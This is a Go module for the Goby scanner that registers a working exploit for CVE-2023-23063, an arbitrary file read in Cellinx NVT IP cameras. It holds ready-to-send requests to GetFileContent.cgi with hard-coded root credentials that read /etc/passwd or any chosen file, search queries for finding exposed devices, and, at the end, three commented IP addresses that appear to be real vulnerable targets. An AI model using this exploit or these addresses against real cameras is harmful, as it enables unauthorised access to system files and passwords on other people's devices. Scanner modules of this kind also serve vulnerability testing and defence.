package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cellinx NVT GetFileContent.cgi Arbitrary File Read Vulnerability (CVE-2023-23063)",
    "Description": "<p>Cellinx NVT IP PTZ is a camera device of Cellinx Corporation in South Korea.</p><p>Cellinx NVT v1.0.6.002b version has a security vulnerability. The vulnerability is due to a local file disclosure vulnerability, which allows attackers to read sensitive information such as system passwords.</p>",
    "Product": "Cellinx-NVT",
    "Homepage": "https://www.ispyconnect.com/camera/cellinx",
    "DisclosureDate": "2023-02-23",
    "Author": "h1ei1",
    "FofaQuery": "body=\"local/NVT-string.js\"",
    "GobyQuery": "body=\"local/NVT-string.js\"",
    "Level": "2",
    "Impact": "<p>Cellinx NVT v1.0.6.002b version has a security vulnerability. The vulnerability is due to a local file disclosure vulnerability, which allows attackers to read sensitive information such as system passwords.</p>",
    "Recommendation": "<p>1. Limit the parameters passed in the relevant file.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH={{{filePath}}}&_=1672577046605",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-23063"
    ],
    "CNNVD": [
        "CNNVD-202302-1760"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞 （CVE-2023-23063）",
            "Product": "Cellinx-NVT",
            "Description": "<p>Cellinx NVT IP PTZ是韩国Cellinx公司的一个摄像机设备。<br></p><p>Cellinx NVT v1.0.6.002b版本存在安全漏洞，该漏洞源于存在本地文件泄露漏洞，攻击者可读取系统密码等敏感信息。<br></p>",
            "Recommendation": "<p>1、对相关文件中传入的参数进行限制。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Cellinx NVT v1.0.6.002b版本存在安全漏洞，该漏洞源于存在本地文件泄露漏洞，攻击者可读取系统密码等敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Cellinx NVT GetFileContent.cgi Arbitrary File Read Vulnerability (CVE-2023-23063)",
            "Product": "Cellinx-NVT",
            "Description": "<p>Cellinx NVT IP PTZ is a camera device of Cellinx Corporation in South Korea.<br></p><p>Cellinx NVT v1.0.6.002b version has a security vulnerability. The vulnerability is due to a local file disclosure vulnerability, which allows attackers to read sensitive information such as system passwords.<br></p>",
            "Recommendation": "<p>1. Limit the parameters passed in the relevant file.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Cellinx NVT v1.0.6.002b version has a security vulnerability. The vulnerability is due to a local file disclosure vulnerability, which allows attackers to read sensitive information such as system passwords.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-01",
    "PocId": "10812"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//58.149.14.210:8081
//218.158.5.14
//121.179.108.246